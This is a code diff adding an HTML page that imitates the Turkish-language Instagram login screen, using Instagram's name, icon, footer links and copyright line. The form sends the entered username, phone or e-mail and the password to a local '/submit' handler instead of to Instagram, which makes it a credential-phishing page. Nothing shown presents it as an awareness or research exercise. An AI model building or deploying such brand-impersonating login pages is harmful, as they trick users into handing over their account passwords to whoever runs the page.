@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Giriş Yap • Instagram</title>
+
+  <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png?20200512141346" type="image/x-icon">
+
+  
+
+</head>
+<body>
+  <form class="form" action="/submit" method="post">
+
+    <div class="baslik">Instagram</div>
+
+    <div class="inputs__ops">
+      <input type="text" id="username" name="username" required>
+      <div class="label">Telefon numarası, kullanıcı adı veya e-posta</div>
+    </div>
+
+    <div class="inputs__ops">
+      <input type="password" id="password" name="password" required>
+      <div class="label">Şifre</div>
+    </div>
+
+    <input class="button" type="submit" value="Giriş Yap">
+
+    <div class="cizgi__wrapper">
+      <div class="cizgi"></div>
+      <span>YA DA</span>
+    </div>
+
+    <div class="facebook">
+      <i class="bi bi-facebook"></i>
+      Facebook ile Giriş Yap
+    </div>
+
+    <div class="forgot">
+      Şifreni mi unuttun?
+    </div>
+
+  </form>
+  <br>
+
+  <div class="ops">
+    <span>Meta</span>
+    <span>Hakkında</span>
+    <span>Blog</span>
+    <span>İş Fırsatları</span>
+    <span>Yardım</span>
+    <span>API</span>
+    <span>Gizlilik</span>
+    <span>Koşullar</span>
+    <span>Konumlar</span>
+    <span>Instagram Lite</span>
+    <span>Threads</span>
+    <span>Kişi Yükleme ve Hesabı Olmayan Kişiler</span>
+    <span>Meta Verified</span>
+  </div>
+
+  <div class="ops__bottom">
+    Türkçe <i class="bi bi-caret-down"></i>
+    <span>© 2023 Instagram from Meta</span>
+  </div>
+
+
+
+
+
+
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Lobster+Two&family=Roboto:wght@400;700&display=swap");
+@import url("https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css");
+
+*{
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+    border: none;
+    outline: none;
+    scroll-behavior: smooth;
+}
+
+/* 
+font-family: 'Lobster Two', cursive;
+font-family: 'Roboto', sans-serif;
+*/
+
+:root{
+    --border-color: #DBDBDB;
+    --text-color: #737373;
+    --input-bg: #FAFAFA;
+    --button-color: #4CB5F9;
+    --facebook-color: #385185;
+}
+
+
+body{
+    font-family: 'Roboto', sans-serif;
+}
+
+.baslik{
+    font-family: 'Lobster Two', cursive;
+    font-size: 40px;
+    font-weight: bold;
+    width: 100%;
+    text-align: center;
+    margin-top: 50px;
+    margin-bottom: 40px;
+    pointer-events: none;
+}
+
+.form{
+    border: 1px solid var(--border-color);
+    width: 350px;
+    height: 400px;
+    margin: auto;
+    margin-top: 6.5%;
+    border-radius: 1px;
+}
+
+.inputs__ops{
+    width: 100%;
+    height: 40px;
+    position: relative;
+
+    
+}
+
+
+
+.inputs__ops input{
+    border: 1px solid var(--border-color);
+    background-color: var(--input-bg);
+    width: 76%;
+    height: 35px;
+    border-radius: 3px;
+    margin-left: 12%;
+    font-size: 12px;
+    padding-left: 10px;
+    line-height: 30px;
+    
+    position: absolute;
+    
+}
+
+.inputs__ops input:focus{
+    border: 1px solid var(--text-color);
+}
+
+
+.label{
+  position: absolute;
+  padding-top: 10px;
+  margin-left: 52px;
+  color: var(--text-color);
+  font-size: 12px;
+  pointer-events: none;
+  transition: all .2s ease-in-out;
+  
+}
+
+
+
+.inputs__ops input:valid + .label{
+    transform: translateY(-1px);
+    margin-left: 45px;
+    font-size: 9px;
+    padding: 5px;
+}
+
+
+.inputs__ops input:valid{
+  padding-top: 12px;
+}
+  
+.button{
+    border: none;
+    background-color: var(--button-color);
+    color: white;
+    font-weight: bold;
+    font-size: 14px;
+    width: 76%;
+    margin-left: 12%;
+    height: 30px;
+    border-radius: 7px;
+    margin-top: 7px;
+    cursor: pointer;
+    padding-top: 3px;
+}
+
+
+
+.cizgi__wrapper{
+    width: 100%;
+    text-align: center;
+    position: relative;
+    margin-top: -10px;
+    
+    
+}
+
+.cizgi__wrapper span{
+    background-color: white;
+    padding: 10px 20px;
+    text-align: center;
+    position: fixed;
+    margin-top: -17px;
+    margin-left: -42px;
+    color: var(--text-color);
+    font-weight: bold;
+    position: absolute;
+    font-size: 13px;
+}
+
+.cizgi{
+    height: 1px;
+    width: 76%;
+    background-color: var(--border-color);
+    margin-left: 12%;
+    margin-top: 35px;
+}
+
+
+.facebook{
+    color: var(--facebook-color);
+    font-weight: bold;
+    width: 100%;
+    text-align: center;
+    margin-top: 40px;
+    cursor: pointer;
+    font-size: 14px;
+}
+
+.facebook i{
+  margin-right: 5px;
+}
+
+.forgot{
+    width: 100%;
+    text-align: center;
+    margin-top: 20px;
+    font-size: 12px;
+    cursor: pointer;
+}
+
+.ops{
+    color: var(--text-color);
+    font-size: 11px;
+    width: 100%;
+    text-align: center;
+    margin-top: 120px;
+}
+
+.ops span{
+    margin-right: 15px;
+    cursor: pointer;
+}
+
+
+.ops__bottom{
+    color: var(--text-color);
+    font-size: 11px;
+    width: 100%;
+    text-align: center;
+    margin-top: 20px;
+}
+
+.ops__bottom span{
+    margin-left: 20px;
+    
+}
+
+.ops span:hover{
+    border-bottom: 1px solid var(--text-color);
+}
+  </style>
+
+</body>
+</html>
